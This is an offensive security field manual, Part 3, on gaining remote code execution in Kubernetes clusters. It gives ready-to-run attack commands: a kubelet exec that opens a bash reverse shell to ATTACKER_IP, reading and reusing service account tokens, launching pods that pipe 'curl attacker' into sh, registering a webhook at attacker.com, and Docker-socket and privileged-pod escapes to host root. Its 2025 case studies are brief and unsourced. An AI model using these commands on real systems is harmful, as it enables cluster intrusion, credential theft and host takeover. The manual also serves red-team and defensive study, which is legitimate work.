# Offensive Security RCE Field Manual — Part 3
## Kubernetes RCE (2025 Edition)
*A comprehensive offensive security module covering Kubernetes attack surfaces, API server exploitation, kubelet abuse, container escape vectors, admission controller hijacking, cloud-native cluster misconfigurations, and modern 2025 RCE pathways observed across real incidents.*

---

# Table of Contents

1. [Introduction](#introduction)  
   - [1.1 Why Kubernetes RCE Is Critical in 2025](#11-why-kubernetes-rce-is-critical-in-2025)  
   - [1.2 Kubernetes Threat Landscape](#12-kubernetes-threat-landscape)

2. [Kubernetes Architecture Attack Overview](#2-kubernetes-architecture-attack-overview)  
   - [2.1 Key Components Relevant to RCE](#21-key-components-relevant-to-rce)  
   - [2.2 Trust Boundaries & What Attackers Exploit](#22-trust-boundaries--what-attackers-exploit)

3. [Kubelet RCE](#3-kubelet-rce)  
   - [3.1 Unauthenticated Kubelet Endpoints](#31-unauthenticated-kubelet-endpoints)  
   - [3.2 Running Commands Through Kubelet](#32-running-commands-through-kubelet)  
   - [3.3 Reverse Shell via Kubelet Exec](#33-reverse-shell-via-kubelet-exec)

4. [Kubernetes API Server Abuse](#4-kubernetes-api-server-abuse)  
   - [4.1 Token Theft → Full Cluster RCE](#41-token-theft--full-cluster-rce)  
   - [4.2 Using ServiceAccount Tokens for RCE](#42-using-serviceaccount-tokens-for-rce)  
   - [4.3 Exploiting Impersonation / RBAC Misconfigurations](#43-exploiting-impersonation--rbac-misconfigurations)

5. [Container Escape Vectors](#5-container-escape-vectors)  
   - [5.1 Mount-Based Escapes](#51-mount-based-escapes)  
   - [5.2 Privileged Pod Escapes](#52-privileged-pod-escapes)  
   - [5.3 Kernel Vulnerability → RCE Escape](#53-kernel-vulnerability--rce-escape)

6. [Admission Controller RCE (2025 Real Cases)](#6-admission-controller-rce-2025-real-cases)  
   - [6.1 Malicious ValidatingWebhookConfig](#61-malicious-validatingwebhookconfig)  
   - [6.2 Admission Webhook RCE Scenario](#62-admission-webhook-rce-scenario)

7. [Insecure CRI / Docker / Containerd Sockets](#7-insecure-cri--docker--containerd-sockets)  
   - [7.1 Docker Daemon → Host RCE](#71-docker-daemon--host-rce)  
   - [7.2 Containerd Shims RCE Cases](#72-containerd-shims-rce-cases)

8. [2025 Kubernetes RCE Case Studies](#8-2025-kubernetes-rce-case-studies)  
   - [8.1 Argo CD (2025)](#81-argo-cd-2025)  
   - [8.2 FluxCD Template Execution RCE](#82-fluxcd-template-execution-rce)  
   - [8.3 GitOps Supply Chain RCE](#83-gitops-supply-chain-rce)

9. [Cloud Provider Kubernetes RCE](#9-cloud-provider-kubernetes-rce)  
   - [9.1 EKS Exploitation](#91-eks-exploitation)  
   - [9.2 AKS Exploitation](#92-aks-exploitation)  
   - [9.3 GKE Exploitation](#93-gke-exploitation)

10. [Conclusion](#conclusion)

---

# Introduction

Kubernetes (k8s) has become the backbone of modern cloud-native infrastructure.  
As enterprises transition into microservices and multi-tenant workloads, the attack surface has expanded dramatically.

Modern adversaries—APT groups, ransomware gangs, and red teams—target Kubernetes clusters to:

- gain full infrastructure control  
- pivot into cloud control planes  
- compromise CI/CD pipelines  
- steal service account tokens  
- escape containers to host-level RCE  
- tamper with supply-chain workflows (e.g., GitOps)  

Kubernetes RCE is no longer niche—**it is one of the most active attack surfaces in 2025**.

---

# 1.1 Why Kubernetes RCE Is Critical in 2025

Kubernetes RCE compromises:

- entire fleet of pods  
- attached volumes (secrets, configmaps, PVs)  
- credentials stored in environment variables  
- service account tokens  
- internal service meshes  
- upstream GitOps manifests  
- host nodes (if escape is achieved)  
- cloud IAM roles (via metadata)  

One Kubernetes RCE often equals:

**“Full cloud breach.”**

---

# 1.2 Kubernetes Threat Landscape

Modern attacks target:

- kubelet unauthenticated ports  
- insecure API servers  
- privileged pods  
- misconfigured RBAC  
- container escapes  
- vulnerable admission controllers  
- exposed CRI sockets (Docker/containerd)  
- GitOps tools with template injection  
- internal service networks  
- supply-chain deployment pipelines  

---

# 2. Kubernetes Architecture Attack Overview

---

# 2.1 Key Components Relevant to RCE

- **Kubelet**: Runs containers; supports remote exec.  
- **API Server**: Core control-plane; primary attacker target.  
- **Scheduler**: Not commonly exploited directly.  
- **Controller Manager**: Indirectly exploited through tokens.  
- **ETCD**: Full cluster control if compromised.

---

# 2.2 Trust Boundaries & What Attackers Exploit

Kubernetes trusts internal networks implicitly.

Attackers abuse this trust by:

- using SSRF to access internal API ports  
- exploiting insecure pod-to-pod traffic  
- misconfigured RBAC to escalate privileges  
- gaining access to service account tokens  
- abusing metadata services from inside pods  

Microservice complexity widens the attack surface.

---

# 3. Kubelet RCE

The kubelet exposes multiple endpoints:

```
/exec
/run
/logs
/portForward
/stats
```

---

# 3.1 Unauthenticated Kubelet Endpoints

Many clusters still have kubelets listening on:

```
0.0.0.0:10250
```

If authentication is disabled, attackers have **full root execution**.

Example check:
```
curl -k https://target:10250/pods
```

---

# 3.2 Running Commands Through Kubelet

Example:
```
curl -k -X POST "https://NODE:10250/exec/default/nginx-12345/nginx" \
  -d "cmd=id&stdout=1&stderr=1"
```

Returns output:
```
uid=0(root) gid=0(root)
```

---

# 3.3 Reverse Shell via Kubelet Exec

```
curl -k -XPOST \
"https://NODE:10250/exec/default/pod/container?command=sh&stdin=1&stdout=1&tty=1" \
--data-binary "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

---

# 4. Kubernetes API Server Abuse

---

# 4.1 Token Theft → Full Cluster RCE

Every pod contains:

```
/var/run/secrets/kubernetes.io/serviceaccount/token
```

Attackers can read it via:

```
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

Use token:

```
curl -H "Authorization: Bearer $TOKEN" \
  https://API_SERVER/api/v1/pods
```

---

# 4.2 Using ServiceAccount Tokens for RCE

If token has high privileges:

```
kubectl exec -it victim-pod -- /bin/sh
```

or attackers can create new pods:

```
kubectl run pwn --image=alpine -- sh -c "curl attacker | sh"
```

---

# 4.3 Exploiting Impersonation / RBAC Misconfigurations

If impersonation enabled:

```
curl -H "Impersonate-User: admin" https://api
```

Or RBAC misconfig allows:

```
create pods
create deployments
use secrets
exec into existing pods
```

This becomes instant RCE.

---

# 5. Container Escape Vectors

---

# 5.1 Mount-Based Escapes

If a pod mounts hostPath:
```
/var/run/docker.sock
/var/run/containerd
/etc
/lib/modules
```

Attackers can manipulate host OS.

Example to escape via Docker socket:
```
docker run -v /:/host -it alpine chroot /host sh
```

---

# 5.2 Privileged Pod Escapes

If a pod runs with:

```
privileged: true
```

or

```
capAdd: ["ALL"]
```

or

```
allowPrivilegeEscalation: true
```

Then attackers can break out using:

```
mount -o bind / /host
chroot /host
```

Full host RCE achieved.

---

# 5.3 Kernel Vulnerability → RCE Escape

Historical + modern kernel bugs:
- Dirty COW  
- Dirty Pipe  
- Sequoia  
- OverlayFS CVEs  
- container runtime privilege escalations  

Attackers combine in-container exploits → host takeover.

---

# 6. Admission Controller RCE (2025 Real Cases)

Admission controllers mutate or validate pods.

If malicious or misconfigured, attackers can:

- deploy malicious webhook  
- insert container escape payloads  
- modify images at admission time  
- achieve RCE before pod creation  

---

# 6.1 Malicious ValidatingWebhookConfig

Attackers with moderate RBAC permissions can register a fake webhook:

```
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
...
clientConfig:
  url: https://attacker.com/webhook
```

Webhook injects malicious pod spec.

---

# 6.2 Admission Webhook RCE Scenario

1. Attacker compromises microservice  
2. They register webhook that modifies all pods  
3. Webhook adds:
```
privileged: true
```
4. New pods spawn with full host access  
5. Attacker has cluster-wide RCE  

---

# 7. Insecure CRI / Docker / Containerd Sockets

---

# 7.1 Docker Daemon → Host RCE

If Docker socket mounted:
```
/var/run/docker.sock
```

Attacker can run:
```
docker run -v /:/host -it ubuntu chroot /host sh
```

Instant host root.

---

# 7.2 Containerd Shims RCE Cases

2025 research shows that containerd-shim API exposure enables:

- spawning arbitrary containers  
- overwriting runtime configs  
- achieving node-level RCE  

---

# 8. 2025 Kubernetes RCE Case Studies

---

# 8.1 Argo CD (2025)

Template injection in App-of-Apps:

```
{{ exec "bash -c curl attacker | sh" }}
```

Led to multi-cluster compromise.

---

# 8.2 FluxCD Template Execution RCE

GitOps templates processed attacker-supplied values.  
Injected code executed on cluster.

---

# 8.3 GitOps Supply Chain RCE

2025 incident:
1. SSRF in dev portal  
2. Attacker accessed internal GitOps repo  
3. Modified Helm chart templates  
4. Malicious initContainer spawned reverse shell  
5. Cluster-wide RCE  

---

# 9. Cloud Provider Kubernetes RCE

---

# 9.1 EKS Exploitation

Misconfigured OIDC provider allowed attackers to impersonate:

```
system:masters
```

Full cluster RCE.

---

# 9.2 AKS Exploitation

AAD integration allowed privilege escalation → API admin → RCE.

---

# 9.3 GKE Exploitation

Workload Identity misconfiguration let attackers access GCP APIs → deploy malicious container → run commands on cluster.

---

# Conclusion

Kubernetes RCE is one of the most impactful offensive vectors in 2025.  
Misconfigurations, insecure defaults, privileged pods, admission controller abuse, and cloud identity integrations allow attackers to escalate from a single compromised container to **full cluster and cloud takeover**.

Modern intrusions regularly include:
- kubelet abuse  
- API server exploitation  
- pod escape  
- GitOps manipulation  
- metadata token theft  

Understanding these attack paths is essential for both offensive and defensive security teams.

---

# END OF PART 3
